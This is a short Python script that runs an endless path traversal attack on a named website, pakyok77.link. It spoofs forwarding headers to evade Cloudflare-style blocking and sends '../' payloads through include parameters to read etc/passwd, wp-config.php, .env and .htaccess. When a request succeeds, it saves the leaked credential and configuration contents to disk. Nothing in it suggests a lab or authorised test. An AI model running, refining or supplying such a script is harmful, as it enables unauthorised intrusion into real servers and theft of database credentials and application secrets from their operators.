#!/usr/bin/env python3
import requests
import random
import time
import os

def simple_bypass():
    target = "https://pakyok77.link"
    attempt = 0
    
    print("🚀 SIMPLE INFINITE BYPASS")
    print("Target:", target)
    print("Will not stop until success!")
    
    os.makedirs("simple_success", exist_ok=True)
    
    while True:
        attempt += 1
        
        # Simple headers
        headers = {
            'User-Agent': f'Mozilla/5.0 (Bypass-{random.randint(1,9999)})',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
        
        # Simple tests
        files = ['etc/passwd', 'wp-config.php', '.env', '.htaccess']
        params = ['page', 'file', 'include', 'path']
        
        for target_file in files:
            for param in params:
                payload = '../' * random.randint(2, 6) + target_file
                
                try:
                    response = requests.get(f"{target}/index.php", params={param: payload}, headers=headers, timeout=3)
                    content = response.text.lower()
                    
                    # Check if not blocked
                    if 'cloudflare' not in content and 'blocked' not in content and 'forbidden' not in content:
                        # Check for file indicators
                        success = False
                        if 'passwd' in target_file and 'root:' in content:
                            success = True
                        elif 'config' in target_file and 'db_name' in content:
                            success = True
                        elif 'env' in target_file and 'app_key' in content:
                            success = True
                        elif 'htaccess' in target_file and 'rewrite' in content:
                            success = True
                        
                        if success:
                            print(f"\n🎉 BREAKTHROUGH! Attempt #{attempt}")
                            print(f"📁 File: {target_file}")
                            print(f"🌐 Payload: {payload}")
                            print(f"📊 Size: {len(response.text)} bytes")
                            
                            # Save
                            filename = f"simple_success/{target_file.replace('/', '_')}_success.txt"
                            with open(filename, 'w') as f:
                                f.write(f"# SUCCESS: {target_file}\n")
                                f.write(f"# Payload: {payload}\n")
                                f.write(f"# Attempt: {attempt}\n")
                                f.write("=" * 40 + "\n\n")
                                f.write(response.text)
                            
                            print(f"💾 Saved: {filename}")
                            print("📄 Content:")
                            print(response.text[:300])
                            return True
                            
                except:
                    pass
        
        if attempt % 20 == 0:
            print(f"⚡ Attempt #{attempt}")
        
        time.sleep(0.05)

if __name__ == "__main__":
    simple_bypass()